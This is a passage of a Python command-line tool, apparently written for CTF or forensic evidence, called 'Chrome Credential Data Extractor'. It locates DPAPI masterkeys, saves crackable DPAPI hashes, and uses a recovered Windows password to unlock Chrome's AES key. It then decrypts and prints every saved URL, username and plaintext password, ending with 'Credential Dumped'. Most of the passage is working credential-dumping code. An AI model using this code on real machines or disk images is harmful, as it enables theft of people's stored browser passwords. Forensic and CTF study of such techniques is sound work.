        results.append({'origin_url': record.get('origin_url', ''), 'action_url': record.get('action_url', ''), 'username': record.get('username_value', ''), 'password': password, 'decryption_error': decryption_error, 'password_format': blob_format, 'encrypted_size': len(encrypted_password) if encrypted_password else 0, 'date_created': chrome_timestamp(record.get('date_created')), 'date_last_used': chrome_timestamp(record.get('date_last_used'))}) # Show  decrypted login information
    return results # Return all Chrome login records

def chrome_timestamp(value):
    if value in (None, 0, ''): # Check if timestamp value is empty or not re
        return None # Return nothing if values match
    try:
        epoch = datetime(1601, 1, 1, tzinfo=timezone.utc) # Chrome/WebKit timestamps
        return (epoch + timedelta(microseconds=int(value))).isoformat() # Add timestamp value to  Chrome epoch and convert it to readable format
    except (ValueError, OverflowError, TypeError): # Error catching in case masterkey cannot be converted
        return None

def identify_password_blob(blob):
    if blob is None: # Check if is no password data
        return 'empty'
    if isinstance(blob, memoryview): # Convert memoryview data into bytes
        blob = blob.tobytes()
    if blob.startswith(b'v10'): # Check if blob uses v10 format
        return 'v10'
    if blob.startswith(b'v11'): # Check if blob uses v11 format
        return 'v11'
    if blob.startswith(b'v20'): # Check if blob uses v20 format
        return 'v20'
    return 'legacy / DPAPI / unknown' # Return unknown if it does not match any of  formats

def inspect_login_database(login_data_path):
    if not login_data_path.exists(): # Check if  Chrome file exists
        raise FileNotFoundError(f'Login Data not found: {login_data_path}')
    with tempfile.TemporaryDirectory() as temp_dir: # Create a temp folder so original database is not changed
        working_copy = Path(temp_dir) / 'Login Data' # Create path for copied database
        shutil.copy2(login_data_path, working_copy) # Copy Login Data file into  temporary folder
        connection = sqlite3.connect(str(working_copy)) # Connect to copied Chrome database
        try:
            cursor = connection.cursor() # Create a cursor to run SQL commands
            cursor.execute('PRAGMA table_info(logins)') # Get  columns available inside logins table
            available_columns = {row[1] for row in cursor.fetchall()} # Store all available column names
            required = {'origin_url', 'username_value', 'password_value'} # Columns needed from  Chrome database
            missing = required - available_columns # Check if any required columns are missing
            if missing: # Stop if  database does not contain  required columns
                raise ValueError('Login Data database is missing expected column(s): ' + ', '.join(sorted(missing)))
            requested = ['origin_url', 'action_url', 'username_value', 'password_value', 'date_created', 'date_last_used'] # Columns to collect from login database
            selected = [column for column in requested if column in available_columns] # Only use columns that exist
            cursor.execute('SELECT ' + ', '.join(selected) + ' FROM logins ' + ('ORDER BY date_created' if 'date_created' in selected else '')) # Read login records from  database
            rows = cursor.fetchall() # Store all login rows returned from  database
        finally:
            connection.close() # Close database connection after reading it
    results = [] # Empty list to store login records
    for row in rows: # Go through each login record found
        record = dict(zip(selected, row)) # Match each database value with its column name
        password_blob = record.get('password_value') # Get  encrypted password data
        if isinstance(password_blob, memoryview):
            password_blob = password_blob.tobytes() # Convert memoryview password data into bytes
        results.append({'origin_url': record.get('origin_url', ''), 'action_url': record.get('action_url', ''), 'username': record.get('username_value', ''), 'password_format': identify_password_blob(password_blob), 'encrypted_size': len(password_blob) if password_blob else 0, 'date_created': chrome_timestamp(record.get('date_created')), 'date_last_used': chrome_timestamp(record.get('date_last_used'))}) # Show login information
    return results


#////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////#
def analyze_option():
    print('\n=== Option 1: Analyze Chrome and DPAPI Artifacts ===\n')
    evidence_path = input('Enter path to extracted CTF/evidence directory: ').strip().strip('"')
    if not evidence_path:
        print('No path provided.')
        return
    root = Path(evidence_path)
    report = analyze(root)
    print_report(report)
    save = input('\nSave DPAPI hash to a file? [y/n]: ').strip().lower()
    if save == 'y':
        output_name = input('Output filename [dpapi_hash.txt]: ').strip()
        if not output_name:
            output_name = 'dpapi_hash.txt'
        count = save_dpapi_hashes(report, Path(output_name))
        if count:
            print(f'[+] Saved {count} DPAPI hash(es) to {Path(output_name).resolve()}')
        else:
            print('[!] No DPAPI hash was generated.')

#////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////#
def extract_option():
    print('\n=== Option 2: Inspect Chrome Login Data After Recovery ===\n')
    evidence_path = input('Enter path to extracted CTF/evidence directory: ').strip().strip('"')
    if not evidence_path:
        print('[!] No path provided.')
        return
    root = Path(evidence_path)
    if not root.exists():
        print(f'[!] Directory does not exist: {root}')
        return
    if not root.is_dir():
        print(f'[!] Not a directory: {root}')
        return
    print('\n[+] Discovering DPAPI and Chrome artifacts...')
    report = analyze(root)
    matches = report.get('masterkey_matches', [])
    if not matches:
        print('[!] No matching DPAPI masterkey found.')
        return
    if len(matches) > 1:
        print(f'[!] Found {len(matches)} matches. Using  first match.')
    match = matches[0]
    print(f"[+] Required masterkey: {match['required_guid']}")
    print(f"[+] SID: {match['sid']}")
    print(f"[+] Masterkey file: {match['masterkey_path']}")
    password = input('\nEnter recovered Windows password: ')
    if not password:
        print('[!] No password provided.')
        return
    parsed_masterkey = parse_masterkey_file(Path(match['masterkey_path']))
    print('\n[+] Testing recovered password against DPAPI masterkey...')
    result = decrypt_local_masterkey(parsed_masterkey, match['sid'], password)
    if not result.get('success'):
        print(f"[!] {result.get('error')}")
        return
    print('[+] Password successfully unlocked  DPAPI masterkey.')
    print(f"[+] Masterkey SHA1: {result['masterkey_sha1']}")
    decrypted_masterkey = result['masterkey']
    local_state_path = Path(match['local_state'])
    print('\n[+] Decrypting Chrome encrypted key...')
    chrome_key_result = recover_chrome_aes_key(local_state_path, decrypted_masterkey)
    chrome_key = chrome_key_result['key']
    print('[+] Chrome AES key recovered.')
    print(f"[+] AES key length: {len(chrome_key)} bytes")
    chrome_entries = report.get('chrome', [])
    if not chrome_entries:
        print('[!] No Chrome artifacts found.')
        return
    login_paths = []
    for chrome_entry in chrome_entries:
        login_paths.extend(chrome_entry.get('login_data', []))
    if not login_paths:
        print('[!] No Login Data database found.')
        return
    for login_path in login_paths:
        path = Path(login_path)
        print('\n========================================')
        print(f'Chrome database:\n{path}')
        print('========================================')
        records = decrypt_login_database(path, chrome_key)
        print(f'\n[+] Found {len(records)} login records.\n')
        for index, record in enumerate(records, start=1):
            print(f'--- Login {index} ---')
            print(f"URL: {record['origin_url']}")
            if record['action_url']:
                print(f"Action URL: {record['action_url']}")
            print(f"Username: {record['username']}")
            print(f"Password blob: {record['password_format']}")
            if record['password'] is not None:
                print(f"Password: {record['password']}")
            else:
                print('Password: <decryption failed>')
                if record['decryption_error']:
                    print(f"Reason: {record['decryption_error']}")
                print(f"Encrypted size: {record['encrypted_size']} bytes")
            if record['date_created']:
                print(f"Created: {record['date_created']}")
            if record['date_last_used']:
                print(f"Last used: {record['date_last_used']}")
            print()
    print('Credential Dumped')

#////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////#
def main():
    while True:
        print('\n========================================')
        print('Chrome Credential Data Extractor')
        print('========================================')
        print('1. Analyze Chrome and DPAPI artifacts')
        print('2. Extract Chrome Login Data with password')
        print('0. Exit')
        choice = input('Select option: ').strip()
        try:
            if choice == '1':
                analyze_option()
            elif choice == '2':
                extract_option()
            elif choice == '0':
                print('\nGoodbye Mr West Mr West.')
                break
            else:
                print('Invalid option, please choose 1, 2, or 0.')
        except (FileNotFoundError, NotADirectoryError, PermissionError, OSError, ValueError, sqlite3.DatabaseError) as e:
            print(f'\nError: {e}')
if __name__ == '__main__':
    main()
